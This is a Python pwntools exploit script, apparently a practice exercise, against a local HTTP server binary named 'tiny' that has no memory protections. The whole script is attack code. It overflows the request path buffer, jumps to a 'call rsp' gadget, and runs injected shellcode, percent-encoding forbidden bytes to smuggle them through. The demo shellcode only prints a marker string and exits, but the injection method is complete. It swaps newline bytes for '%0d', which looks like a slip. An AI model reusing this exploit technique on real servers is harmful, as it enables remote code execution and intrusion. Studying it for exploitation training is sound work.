from IPython import embed
from pwn import *
import sys, subprocess
import re

context.terminal = ['tmux', 'splitw', '-h']

ADDR = "127.0.0.1"
PORT = 9999
local_file = './tiny' # no protections

def package_http_request(path):
    return b"".join([
        b"GET ", path, b" HTTP/1.1\r\n",
        f"Host: {ADDR}:{PORT}\r\n".encode(),
        b"User-Agent: Hacker\r\n",
        b"\r\n"
        ])

def validate_shellcode(shellcode, forbidden=[]):
    for byte in forbidden:
        if byte in shellcode:
            return False
    return True

def c(comment):
    """this is just a hack to insert comments in the asm string"""
    return ""


def run_expl():
    p = remote(ADDR, PORT)
    # p.clean()
    
    padding_size = 0x230 # tiny no-protections

    shellcode_payload = f"""
      mov rax, 0x6161616161616161
      push rax
      push rsp
      pop rsi      {c("pointer to the string")}

      xor rax, rax
      mov al, 0x1  {c("write syscall")}
      xor rdi, rdi
      mov dil, 0x1 {c("stdout fd")}
      xor rdx, rdx
      mov dl, 0x8  {c("size")}
      syscall

      xor rax, rax
      mov al, 0x3c {c("exit syscall")}
      xor rdi, rdi
      syscall
    """

    context.log_level = "info"
    e = ELF(local_file)
    context.binary = e
    # libc = e.libc
    # libc.address = libc_base

    shellcode_bytes = asm(shellcode_payload)
    if(not validate_shellcode(shellcode_bytes, forbidden=[0x0, 0x20, 0x0a, 0x0d])):
        print("ERROR shellcode contains invalid bytes!")
        sys.exit(1)

    print(shellcode_bytes)

    # buffer overflow
    expl = b''
    #expl += shellcode_bytes
    #expl += b'a'*(padding_size-len(shellcode_bytes)) #padding, excluding rbp bytes
    expl += b'a'*padding_size
    expl += b'b'*8 #rbp
    expl += p64(0x4283fb) # call rsp;
    expl += shellcode_bytes

    #use byte encoding to smuggle forbidden bytes in the buffer
    expl = expl.replace(b'\x00', b'%00')
    expl = expl.replace(b'\x20', b'%20')
    expl = expl.replace(b'\x0a', b'%0d')

    print("EXPL:")
    print(expl)
    http_req = package_http_request(expl)




    p.send(http_req)
    print(http_req)
    out = p.clean(timeout=1)
    print("---out---")
    print(out)
    p.close()

run_expl()
